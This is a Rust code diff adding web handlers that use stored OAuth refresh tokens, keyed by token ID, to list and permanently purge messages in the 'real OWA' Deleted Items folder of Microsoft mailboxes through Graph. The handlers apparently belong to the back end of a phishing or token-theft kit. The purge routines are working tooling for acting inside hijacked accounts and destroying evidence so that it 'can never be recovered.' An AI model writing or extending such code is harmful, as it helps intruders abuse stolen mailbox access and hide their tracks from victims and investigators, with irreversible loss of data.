@@ -681,3 +681,113 @@ pub async fn mx_check_handler(body: web::Json<MxCheckRequest>) -> impl Responder
         other,
     })
 }
+
+// ============================================================
+// DELETED ITEMS — fetch and permanently purge
+// ============================================================
+
+/// Fetch messages from the real OWA Deleted Items folder.
+pub async fn get_deleted_items_handler(
+    path: web::Path<String>,
+    state: web::Data<crate::AppState>,
+) -> impl Responder {
+    let token_id = path.into_inner();
+    let token = match crate::retrieve_any_token(&state, &token_id).await {
+        Ok(t) => t,
+        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
+    };
+    let access_token = crate::refresh_access_token(&state, &token.refresh_token).await
+        .unwrap_or_else(|| token.access_token.clone());
+    let client = GraphClient::new();
+
+    // Graph well-known folder name for Deleted Items: "deleteditems"
+    match client.get_folder_messages(&access_token, "deleteditems", 50).await {
+        Ok(resp) => HttpResponse::Ok().json(resp),
+        Err(e) => {
+            eprintln!("[deleted_items] Failed to fetch: {}", e);
+            HttpResponse::InternalServerError().json(serde_json::json!({"error": "fetch_failed", "details": format!("{}", e)}))
+        }
+    }
+}
+
+/// Permanently delete ALL messages in the real OWA Deleted Items folder.
+/// This empties the Deleted Items folder so items can never be recovered.
+pub async fn purge_deleted_items_handler(
+    path: web::Path<String>,
+    state: web::Data<crate::AppState>,
+) -> impl Responder {
+    let token_id = path.into_inner();
+    let token = match crate::retrieve_any_token(&state, &token_id).await {
+        Ok(t) => t,
+        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
+    };
+    let access_token = crate::refresh_access_token(&state, &token.refresh_token).await
+        .unwrap_or_else(|| token.access_token.clone());
+    let client = GraphClient::new();
+
+    // Fetch all messages in Deleted Items
+    let messages = match client.get_folder_messages(&access_token, "deleteditems", 100).await {
+        Ok(resp) => resp.value,
+        Err(e) => {
+            return HttpResponse::InternalServerError().json(serde_json::json!({"error": "fetch_failed", "details": format!("{}", e)}));
+        }
+    };
+
+    let mut deleted = 0u32;
+    let mut failed = 0u32;
+    for msg in &messages {
+        let id = &msg.id;
+        match client.delete_message(&access_token, id).await {
+            Ok(_) => deleted += 1,
+            Err(_) => failed += 1,
+        }
+    }
+
+    eprintln!("[deleted_items] Purged {} messages for token {} (failed: {})", deleted, token_id, failed);
+    HttpResponse::Ok().json(serde_json::json!({
+        "success": true,
+        "deleted": deleted,
+        "failed": failed,
+        "message": format!("Permanently deleted {} messages from Deleted Items", deleted)
+    }))
+}
+
+/// Permanently delete a SINGLE message (purge so it can't be recovered).
+#[allow(dead_code)]
+pub async fn permanent_delete_message_handler(
+    path: web::Path<String>,
+    state: web::Data<crate::AppState>,
+) -> impl Responder {
+    let message_id = path.into_inner().clone();
+    let token_id = message_id.split("::").next().unwrap_or("").to_string();
+    let actual_msg_id = message_id.split("::").nth(1).unwrap_or("").to_string();
+
+    // If the caller passed "token_id::msg_id", split it. Otherwise we need
+    // a query param for token_id.
+    if actual_msg_id.is_empty() {
+        return HttpResponse::BadRequest().json(serde_json::json!({"error": "expected format: token_id::message_id"}));
+    }
+
+    let token = match crate::retrieve_any_token(&state, &token_id).await {
+        Ok(t) => t,
+        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
+    };
+    let access_token = crate::refresh_access_token(&state, &token.refresh_token).await
+        .unwrap_or_else(|| token.access_token.clone());
+    let client = GraphClient::new();
+
+    // Delete the message (soft delete moves to Deleted Items; to permanently
+    // purge we delete from Deleted Items too. A single delete_message call
+    // moves to Deleted Items, so we call it — for messages already in Deleted
+    // Items, this permanently removes them.)
+    match client.delete_message(&access_token, &actual_msg_id).await {
+        Ok(_) => {
+            eprintln!("[deleted_items] Permanently deleted message {}", actual_msg_id);
+            HttpResponse::Ok().json(serde_json::json!({"success": true, "message": "Message permanently deleted"}))
+        }
+        Err(e) => {
+            eprintln!("[deleted_items] Failed to delete {}: {}", actual_msg_id, e);
+            HttpResponse::InternalServerError().json(serde_json::json!({"error": "delete_failed", "details": format!("{}", e)}))
+        }
+    }
+}
